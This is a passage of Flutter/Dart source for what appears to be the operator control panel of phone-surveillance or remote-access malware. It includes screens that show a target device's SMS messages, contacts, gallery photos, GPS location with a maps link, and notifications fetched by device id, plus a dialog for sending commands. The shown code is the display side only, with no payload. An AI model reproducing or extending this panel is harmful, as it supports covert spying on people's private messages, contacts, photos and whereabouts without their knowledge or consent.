      content: _field(ctrl, label, hint: hint, isNum: isNumber),
      actions: [
        TextButton(onPressed: () => Navigator.pop(context), child: const Text('Cancel', style: TextStyle(color: _kSub))),
        ElevatedButton(
          style: ElevatedButton.styleFrom(backgroundColor: _kRed, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8))),
          onPressed: () { Navigator.pop(context); onDone(ctrl.text.trim()); },
          child: const Text('Send', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold))),
      ],
    ));
  }

  // ─────────────────────────────────────────────────────────────────────────
  // DATA DISPLAY
  // ─────────────────────────────────────────────────────────────────────────
  void _fetchNotif() async {
    _addLog('Fetching notifications...');
    try {
      final res = await http.get(Uri.parse('$_kBase/api/get-notifications/$_id'));
      if (res.statusCode == 200) {
        final list = jsonDecode(res.body) as List;
        _addLog('${list.length} notifications');
        showModalBottomSheet(context: context, backgroundColor: _kCard,
          isScrollControlled: true,
          shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(16))),
          builder: (_) => DraggableScrollableSheet(initialChildSize: 0.6, maxChildSize: 0.9, expand: false,
            builder: (_, sc) => Column(children: [
              Container(height: 4, width: 36, margin: const EdgeInsets.only(top: 10, bottom: 8), decoration: BoxDecoration(color: _kBord, borderRadius: BorderRadius.circular(2))),
              const Text('Notifications', style: TextStyle(color: _kText, fontWeight: FontWeight.bold, fontSize: 14)),
              const SizedBox(height: 8),
              Expanded(child: ListView.separated(controller: sc, padding: const EdgeInsets.symmetric(horizontal: 14),
                itemCount: list.length, separatorBuilder: (_, __) => Divider(color: _kBord, height: 1),
                itemBuilder: (_, i) => ListTile(
                  contentPadding: const EdgeInsets.symmetric(horizontal: 0, vertical: 4),
                  leading: Container(width: 36, height: 36, decoration: BoxDecoration(color: _kPurp.withOpacity(0.15), borderRadius: BorderRadius.circular(8)),
                    child: const Icon(Icons.notifications_rounded, color: _kPurp, size: 18)),
                  title: Text(list[i]['title']?.toString() ?? '-', style: const TextStyle(color: _kText, fontSize: 13, fontWeight: FontWeight.w600)),
                  subtitle: Text(list[i]['body']?.toString() ?? '', style: const TextStyle(color: _kSub, fontSize: 11))),
              )),
            ]),
          ));
      }
    } catch (_) { _addLog('Notif error'); }
  }

  void _imgDialog(String b64, String title) {
    try {
      final c = b64.contains(',') ? b64.split(',').last : b64;
      final bytes = base64Decode(c);
      showDialog(context: context, builder: (_) => Dialog(
        backgroundColor: const Color(0xFF1A0015), insetPadding: const EdgeInsets.all(12),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
        child: Column(mainAxisSize: MainAxisSize.min, children: [
          Padding(padding: const EdgeInsets.all(14),
            child: Text(title, style: const TextStyle(color: _kText, fontWeight: FontWeight.bold, fontSize: 13))),
          ClipRRect(borderRadius: const BorderRadius.vertical(bottom: Radius.circular(12)),
            child: Image.memory(bytes, fit: BoxFit.contain)),
        ]),
      ));
    } catch (_) { _toast('Image decode failed'); }
  }

  void _locationDialog(dynamic lat, dynamic lng) {
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: _kCard, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
      title: const Text('GPS Location', style: TextStyle(color: _kText, fontSize: 14, fontWeight: FontWeight.bold)),
      content: Column(mainAxisSize: MainAxisSize.min, children: [
        Text('Latitude:  $lat', style: const TextStyle(color: _kGreen, fontFamily: 'monospace', fontSize: 13)),
        const SizedBox(height: 4),
        Text('Longitude: $lng', style: const TextStyle(color: _kGreen, fontFamily: 'monospace', fontSize: 13)),
      ]),
      actions: [
        TextButton(onPressed: () => Navigator.pop(context), child: const Text('Close', style: TextStyle(color: _kSub))),
        ElevatedButton(
          style: ElevatedButton.styleFrom(backgroundColor: _kGreen, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8))),
          onPressed: () => launchUrl(Uri.parse('https://www.google.com/maps/search/?api=1&query=$lat,$lng'), mode: LaunchMode.externalApplication),
          child: const Text('Open Maps', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold))),
      ],
    ));
  }

  void _textDialog(String title, String content) {
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: _kCard, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
      title: Text(title, style: const TextStyle(color: _kText, fontSize: 14, fontWeight: FontWeight.bold)),
      content: Container(padding: const EdgeInsets.all(12), decoration: BoxDecoration(color: _kBg, borderRadius: BorderRadius.circular(8)),
        child: SelectableText(content, style: const TextStyle(color: _kGreen, fontFamily: 'monospace', fontSize: 12))),
      actions: [TextButton(onPressed: () => Navigator.pop(context), child: const Text('Close', style: TextStyle(color: _kSub)))],
    ));
  }

  void _contactsSheet(List contacts) {
    showModalBottomSheet(context: context, backgroundColor: _kCard,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(16))),
      builder: (_) => DraggableScrollableSheet(initialChildSize: 0.6, maxChildSize: 0.9, expand: false,
        builder: (_, sc) => Column(children: [
          Container(height: 4, width: 36, margin: const EdgeInsets.only(top: 10, bottom: 8), decoration: BoxDecoration(color: _kBord, borderRadius: BorderRadius.circular(2))),
          Text('Contacts (${contacts.length})', style: const TextStyle(color: _kText, fontWeight: FontWeight.bold, fontSize: 14)),
          const SizedBox(height: 8),
          Expanded(child: ListView.separated(controller: sc, padding: const EdgeInsets.symmetric(horizontal: 14),
            itemCount: contacts.length, separatorBuilder: (_, __) => Divider(color: _kBord, height: 1),
            itemBuilder: (_, i) => ListTile(
              contentPadding: const EdgeInsets.symmetric(horizontal: 0, vertical: 2),
              leading: Container(width: 36, height: 36, decoration: BoxDecoration(color: _kRed.withOpacity(0.1), borderRadius: BorderRadius.circular(8)),
                child: const Icon(Icons.person_rounded, color: _kRed, size: 18)),
              title: Text(contacts[i]['name']?.toString() ?? '-', style: const TextStyle(color: _kText, fontSize: 13)),
              subtitle: Text(contacts[i]['number']?.toString() ?? '-', style: const TextStyle(color: _kSub, fontSize: 11))),
          )),
        ]),
      ));
  }

  void _smsSheet(List sms) {
    showModalBottomSheet(context: context, backgroundColor: _kCard,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(16))),
      builder: (_) => DraggableScrollableSheet(initialChildSize: 0.75, maxChildSize: 0.95, expand: false,
        builder: (_, sc) => Column(children: [
          Container(height: 4, width: 36, margin: const EdgeInsets.only(top: 10, bottom: 8), decoration: BoxDecoration(color: _kBord, borderRadius: BorderRadius.circular(2))),
          Text('SMS (${sms.length})', style: const TextStyle(color: _kText, fontWeight: FontWeight.bold, fontSize: 14)),
          const SizedBox(height: 8),
          Expanded(child: ListView.separated(controller: sc, padding: const EdgeInsets.symmetric(horizontal: 14),
            itemCount: sms.length, separatorBuilder: (_, __) => Divider(color: _kBord, height: 1),
            itemBuilder: (_, i) {
              final s = sms[i] as Map;
              return ListTile(
                contentPadding: const EdgeInsets.symmetric(horizontal: 0, vertical: 4),
                leading: Container(width: 36, height: 36, decoration: BoxDecoration(color: _kCyan.withOpacity(0.1), borderRadius: BorderRadius.circular(8)),
                  child: const Icon(Icons.sms_rounded, color: _kCyan, size: 18)),
                title: Text(s['address']?.toString() ?? '-', style: const TextStyle(color: _kText, fontSize: 13, fontWeight: FontWeight.w600)),
                subtitle: Text(s['body']?.toString() ?? '', style: const TextStyle(color: _kSub, fontSize: 11), maxLines: 2, overflow: TextOverflow.ellipsis));
            })),
        ]),
      ));
  }

  void _gallerySheet(List imgs) {
    showModalBottomSheet(context: context, backgroundColor: _kCard,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(16))),
      builder: (_) => DraggableScrollableSheet(initialChildSize: 0.75, maxChildSize: 0.95, expand: false,
        builder: (_, sc) => Column(children: [
          Container(height: 4, width: 36, margin: const EdgeInsets.only(top: 10, bottom: 8), decoration: BoxDecoration(color: _kBord, borderRadius: BorderRadius.circular(2))),
          Text('Gallery (${imgs.length})', style: const TextStyle(color: _kText, fontWeight: FontWeight.bold, fontSize: 14)),
          const SizedBox(height: 8),
          Expanded(child: imgs.isEmpty
              ? const Center(child: Text('No photos', style: TextStyle(color: _kSub)))
              : GridView.builder(controller: sc, padding: const EdgeInsets.all(10),
                  gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(crossAxisCount: 3, crossAxisSpacing: 4, mainAxisSpacing: 4),
                  itemCount: imgs.length,
                  itemBuilder: (_, i) {
                    try {
                      final raw = imgs[i].toString();
                      final clean = raw.contains(',') ? raw.split(',').last : raw;
                      final bytes = base64Decode(clean);
                      return GestureDetector(
                        onTap: () => _imgDialog(raw, 'Gallery Photo ${i+1}'),
                        child: ClipRRect(borderRadius: BorderRadius.circular(6),
                          child: Image.memory(bytes, fit: BoxFit.cover)));
                    } catch (_) { return Container(decoration: BoxDecoration(color: _kBg, borderRadius: BorderRadius.circular(6))); }
                  })),
        ]),
      ));
  }

  // ─────────────────────────────────────────────────────────────────────────
  // UI HELPERS
  // ─────────────────────────────────────────────────────────────────────────
  Widget get _gap => const SizedBox(height: 10);

  Widget _header(String title, String sub) => Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
    Text(title, style: const TextStyle(color: _kText, fontSize: 15, fontWeight: FontWeight.bold, letterSpacing: 0.2)),
    const SizedBox(height: 2),
    Text(sub, style: const TextStyle(color: _kSub, fontSize: 11)),
    const SizedBox(height: 4),
    Container(height: 1, color: _kBord),
  ]);

  Widget _actionBtn(String label, Color color, IconData icon, VoidCallback fn) =>
    InkWell(onTap: fn, borderRadius: BorderRadius.circular(10),
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 13),
        decoration: BoxDecoration(color: _kCard, borderRadius: BorderRadius.circular(10), border: Border.all(color: _kBord)),
        child: Row(children: [
          Container(width: 34, height: 34, decoration: BoxDecoration(color: color.withOpacity(0.1), borderRadius: BorderRadius.circular(8)),
            child: Icon(icon, color: color, size: 17)),
          const SizedBox(width: 12),
          Expanded(child: Text(label, style: const TextStyle(color: _kText, fontSize: 13, fontWeight: FontWeight.w500))),
          Icon(Icons.chevron_right_rounded, color: _kBord, size: 18),
        ]),
      ),
    );

  Widget _infoRow(String num, String text) => Padding(
    padding: const EdgeInsets.symmetric(vertical: 3),
    child: Row(children: [
      Container(width: 20, height: 20, decoration: BoxDecoration(color: _kOrng.withOpacity(0.1), borderRadius: BorderRadius.circular(4)),
        child: Center(child: Text(num, style: const TextStyle(color: _kOrng, fontSize: 10, fontWeight: FontWeight.bold)))),
      const SizedBox(width: 10),
      Expanded(child: Text(text, style: const TextStyle(color: _kSub, fontSize: 11))),
    ]),
  );

  Widget _field(TextEditingController ctrl, String label, {String hint = '', bool isNum = false}) =>
    TextField(
      controller: ctrl,
      keyboardType: isNum ? TextInputType.number : TextInputType.text,
      style: const TextStyle(color: _kText, fontSize: 13),
      decoration: InputDecoration(
        labelText: label,
        hintText: hint,
        labelStyle: const TextStyle(color: _kSub, fontSize: 12),
        hintStyle: const TextStyle(color: _kSub, fontSize: 12),
        filled: true, fillColor: _kBg,
        contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
        border: OutlineInputBorder(borderRadius: BorderRadius.circular(8), borderSide: const BorderSide(color: _kBord)),
        enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(8), borderSide: const BorderSide(color: _kBord)),
        focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(8), borderSide: const BorderSide(color: _kRed)),
      ),
    );
}
